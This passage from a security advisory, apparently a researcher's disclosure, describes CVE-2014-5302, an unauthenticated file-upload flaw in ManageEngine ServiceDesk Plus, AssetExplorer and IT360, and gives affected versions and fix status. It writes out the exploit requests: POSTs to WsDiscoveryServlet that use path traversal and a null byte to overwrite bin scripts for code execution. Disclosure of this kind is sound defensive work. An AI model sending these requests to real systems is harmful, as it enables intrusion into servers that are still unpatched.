#2
Vulnerability: Remote code execution via file upload (unauthenticated)
CVE-2014-5302
Constraints: no authentication or any other information needed except
for IT360 (guest account needed); code execution is only possible by
    replacing one of the <install_dir>bin/ scripts and waiting for them to
    be executed or for a periodic task to run. This is because only text
    files can be uploaded as binary files are mangled; and there no JSP
    compiler in the $PATH.
    Affected versions: ServiceDesk Plus / Plus MSP v7.6 to v9.0 build
    9026; AssetExplorer v? to v6.1 build 6106; IT360 v? to v10.4

    POST /discoveryServlet/WsDiscoveryServlet?computerName=../bin/run.bat%00
    POST /discoveryServlet/WsDiscoveryServlet?computerName=../bin/backUpData.bat%00
    <...text file / script payload here...>


            Fix:

#1 is fixed on ServiceDesk Plus 9.0 build 9031. It is UNFIXED on all
other products. Disclosure to ManageEngine was done on 04/08/2014, so
over 150 days have elapsed. The last communication I received from
them was that "Once we released this fix in ServiceDesk plus, we
eventually take this in other products like AssetExplorer and
SupportCenter."

#2 is fixed on ServiceDesk Plus 9.0 build 9027 and on AssetExplorer
6.1 build 6107. It is UNFIXED for IT360.
